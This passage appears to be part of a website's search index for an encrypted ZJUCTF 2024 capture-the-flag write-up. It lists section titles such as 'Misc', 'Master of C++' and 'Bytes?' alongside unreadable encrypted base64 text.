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;^","title":"\ud83d\udd12 ZJUCTF 2024"},{"location":"writeups/zjuctf2024/#zjuctf-2024-writeup","text":"4YcRvy1jT3/vas+fbIu+vA==;oq0SnO0COSSFzV5lTRlRaeEZvZqrVxtsJxwy+XN6Vx7AOhyE6kTw81cstvdwFiQXEa5Imb4TRQ8jeYkzGyDzWA2GhJSPs4X2lnufp4I7YVbUO6+wRLO0NH8Uat+pQwG+Q3RK23XoSHJ2IxR+vbzyGw/C0I/prSCeRs2p4VvNPWZG2MPIil7Q5PAEw0cGTGpi4arz75HsEAW5j7Rk2m0SttNlt+mjt2HgV4eshU10P0i0w3lSALRMsP8kPGaA+w9T4dAqAIEZT4LdtXOYKmHnWAYdcpWrmTdgl6HGrN1Jhten6FlQ1FRt/7jD4PJCOx+J8kJBZBggsbr+WUaxmeUSTZQNjs9wogErSJ+2kwIIXp74No0RufyUCmpxMiOTNtUPTy4aU43n4L/fkd1wpVII7vK3/jrZ4Vm52tQEQ9KhXVRJldKcz7VoeA/AsTjeRkDZsJPyHn3yX7f+2YLrwcue0zdjsCWCFtl5isTU7bgy1Un/d9P2PGOLQehFu/NZveAEc3BjyYJT1eE5qyxcBDzIzfjhM2BneMFgZpu/V3eUgOofMApeffwsoy2Ze5vOtdfe4UYe8INqqbZ8CRn95Hj3Hg==;^","title":"ZJUCTF 2024 Writeup"},{"location":"writeups/zjuctf2024/#misc","text":"8RsK/Lg8FqHkcNHQzA4zhg==;feFV1RBJNt3rmIH7jd1zpEndglqPtPnSvQGgqUKsydo=;^","title":"Misc"},{"location":"writeups/zjuctf2024/#a","text":"pmEWHZswvqt4vDpE476w8g==;8DVE9549an+hYXivJKNlfT6a0/2LhbGLa1Oc2bo/+oXmmTu7+lQRIBVrbHxoTDMICxhQ92Mq8d2iKQw3BaUFUUduDS5R2FlBg6wfvwMjZuiigTVOCJmXhq6BpWrIAA5UN3qASgyGvaV1mbXY6hUhU8G8ivtdCxgFBrZ/JW8yCClFhbKSIF6nxLgdRIvR+SOf4edMiJ54aFVU7DkW/rxS2DcWbBZvtvGefid6gT5YuqpvysWSqofpDzBFs4P6IJspbD4cFCNYwT1x5s6ahT23MngSd1FW99mn8rcqqoNhcPB4VS/Zt2RHTmIoVIAuwM0P0p1tHadSKQo0rPZUI8nhynNKIlX2lzcyTU3TqvT47SxtAPfY/Hoe6mXR8F7MSd3m7ymgCGmg8Gx7E8e5yc5bO/PfUjRrbinjagEFWETxg7aACDsXT1x4qt3KFXp+gZKFlwAdfQOXuUaMHYPTYa0/kLdkzjBrIWJWEVaW0WMR7tXwmmr2DZMhG48fyfjltvfLjpQQkG+2eAfx0RaMO2KKNHCl+SYWvbTCgy4HUGJMT0zx/v7/8cl+IxVBtf8HPgV+t+CIwNhT+R44p4YPZIIXS0/Uvq/ypIJ6uN3j/XvMio3HlsQ0DyvKdVVPwJiNFuFjHBn+NerMy/ji8vdgLlQnKvLG8/xOtYWjPSfEjCEICFsE4Z5fLW2qbL3KAOXtIpPyG7vutZMRgDS1AECJqhU9YoPUlguzDKMNokJiIPe1B4+RhfW1x0KypU2dAJiEWjrgfo59+XeXhN6P2oqRA4ItkfT0rBm6BjiLx0YhF7f8wypLktjlkMBfnko2cQhm4KcknKvMSPypoQy43WzezJ6T44aYRBZ1T9xDkFlrScimugRrX9EwboWT9gsQQ2nPW3koqLkrA4nnwmCzRve8m6Snl7v4Y2L9Pl0lFAo0ROoMxOCb4jvWJEkF4gM1BeRDxol36wMMqsWkB+MhX2uBAoL5nvBayR0HLwa+2JbHpHnP1qtuJ/NnCnMXJsg9Tg+xwHILr+HD9/tvMZXeiginetBjM/3nReA98H/cWUvbjPkrAknhscOZYRNUaggUG/FnjAI6qf0lNwDlKoS2Gk5Bol7g5w==;^","title":"\u5c0fA\u53e3\u7b97"},{"location":"writeups/zjuctf2024/#silence","text":"EY/q3WeCanQfZ3ozDYGHIg==;bD9V1BXp3oHTimfs7rB12GuHVyAglFnKDQlJ/rZkrgV5vQgy9ovtGYCfJqlRxxpjsOus3qq9+3+T5QmNnsxTmShKtoaLuYNeO+MMr7TQJmd6cLf0dz3om+9SUiVjZ77ckFk627UOszDT1ZrK+ZTMi3I27JGg4Ui3b3U4xlDjRjehuAlQNEk3sYviSgzeVXdy0bqgSlx1slwj8gpO/Tm+mNtAvHRiy79hSKP/QRdtk9lgNNh2d1WAtkbDQ7nvQ8pr;^","title":"Silence"},{"location":"writeups/zjuctf2024/#master-of-c","text":"XOFmc58paJYOIna+3vLfMw==;bDB6J6+ttY8o2ib3nqbyuiCU8Xi2PozTqTVYsuwI9T1lnJY1vJjdV8q3kxPMN5tyZN9RV2qsUjZP6SzaYKEoMAkMMtnt+C1ZIP0g0OhgxEQ2jMFQdVetNprSAIhgI6sJBoUohG6dwGb10DQjY9pHyeHmbdXDJK6GPEyKs9ILIEvFMjls9CiGI+0hwT1EBphhMIySs+/czQ0DjlqwyZwnBeWk1UkS1zX/p49sZVxmR694PPqUMGWYf0I18NfKetILTHdaKknYtqB/AQRtrwuISCRELI34kNwfmUfV/tJUk9R0QNK9LoNJSI/6IWxLK8A1tt+GIU7KuHB0w+4EjXDYOD/S7/aT2U7dMcIA7drt3sUFpb3K4Wlfo3ye0Xt5YDG9fgGaewmDSH7Hvy19n1mxV+hD9Sim5Mm+4T3l5v2D20c=;^","title":"Master of C++"},{"location":"writeups/zjuctf2024/#cba","text":"o1L/UC2ijQ+tUBtc3WExXA==;vDqRZFo6XsiJmGk2yv6zXHuMjyCyPpjP1E4wBt2frxd+7QuwZPMYWMsX5IaIX347jbNg6pvqOXFBttypGi9MzjPZxYT9osHCieU3iKx/TDnk9W+RaHv5lNgu2zEoOq3UXnovdtqlEXryfv0L23TMIL6RkwFcfmePEAeE3L0ltpX+i0Ouui8RvwdQau4seHQx/aT4EfrCYAPF/S2LLl8qndNbqSOOas6x5TPORzMg1V7Yw57Lb/0CgwsYCqTACFof5ID8xymeLPBt8+N4fPo/IXWrQblhnQrCO4W8CpshbYIXfAIUpqOOmyKpgbM488XvyUoKOXmnTPSFisXh7+F8+w==;^","title":"CBA"},{"location":"writeups/zjuctf2024/#_1","text":"Aq4/2OfUZb/Kt0ISTLbbvg==;yl684H7zvcJaU3PMHJ7GAbJKGyPoCScdYIAECxlzUAz0jok9B4I5PY/TRFSGpbhv5qq1toLgK1VO7Wyy1Anb3j7KTMivskwuHHf87uhTZHexCpjjcachmgxqi92IryAsIo0NssJIMlwdhVpZjyso+IOzSdJzYxxtuwPBeDTfCabtU8AOTcQu7NDXjXaKsRrayuDi5eaUj9cpZ7IIfvsBCZ08dTLt5PQjSWec0G4jgtdpqOGBultf3BRb/h3eqCZq+zkOkXk+AKXJgJ09uRruEfjI6U2YwG7tFBRDZ/6FPtaYvA0tWj2CjuCxz3+4I8w3fG3YmaROUsr22pynXPdIfkmIZ3MtwFwxP6+R0XM4GNDL7qm7I++40JxKN6VefIpzgMPIcX3Vlw7yfzwCD5WTsUTEFLTyJCxcM5STKeSI11pLUXZt7GCqA3N96C8WkjLK5ALr9q3Yn+D+Inkf7ok+VvnGBiTjXPs0SAhoSjEKUv0pNhKsKnC9phIW5YqcvwjIXv0sd6LvuEKxx7JvYneNLLCyWi5jcZAld38kE0Lje9SG6b1konmLIrC9gCE/+7wfl00Lsj1PQosejkr7JZiW4w==;^","title":"\u9505\u91cc\u635e\u9762"},{"location":"writeups/zjuctf2024/#bytes","text":"avm6q/NL7iYKuho5MIFgBQ==;DHM4TVaHudfylil8Fn8N1xnnaEgxldSapW/ApoIhENXZu41WdPMGQ8FqiU6MbjQ8H0AMrCskslbK6naphik3saSSbdqQUxNSCLkQ/hVbYRIemu/922m4O9Ftads53OH0w2is1XrgeYPFIJnMIdN5Hi0PCvJiKe5rjTHSBHW3LE2zs1gJMeUIZEAJj8rpEW4Ml3T6NpuKswYOP0T12mNDy10XkIJfd0Qx9QybhhpWEHLupAUGIzrxxlu9o+clm5cwwy8qfZsuOlAtVE9i9Svlb4d7bluj0tGBhLRd7lwlS3jD0xnR0JxMtbdZKRh799jCLmLmNX/LVTvKMjGDHMGKqA==;^","title":"Bytes?"},{"location":"writeups/zjuctf2024/#minecretf","text":"Wwsfp9ydw+uj6hIbSLTaAQ==;67tqEjzvSuo0a1caj9oXlbjejU8/1x0Qcwyw99CqpVPpYpBHir2kfhl6rzr8i/lZvuPcIoICVCgv2x6V3cvvaerfL62dmGnU5d63AirUfreCPPbjYuoYDxjxWucV/tAgzs20/RYed9vN9W96sFewEzhMFmcX08Q9UJuxOodlV6EY1Wl3Zrw0iZxv6Yz2Wtgqm0oPLUiqbjrpizAfLI2petlO8Vy9SfECes2eR9q6q3FoAdIBpmBCyKQ3+ORcZttvkflNvdVBpEAy+wAfsw46itv/gi/mj/QFLL/2LidbZ+SEfUa705ZyPPhS1eLZ92RpKNvCnUk7MhceJ3fie5zqwfYS/vsTcQHSy4AmkpDOJX/e7GH/m2eur7Ac/U/3mKLJlDdTQxm2xZTzZFIjsgTMgUTbEIaW79S1d9KNxG9JGVnQV8C4w+0Fx4bPx81usB7qjTZOURP1Wtaiq4njV34996OgFSlSaGpKXE48uT8kW99iVJauC2uHHYWwH9z0K4jRPMrgLP0/SPqFA5/ATPadi0oTzCHuoNXwLaPW1Bb8P+9KYWqT7t6PX2hqomqK2aj8S7kDz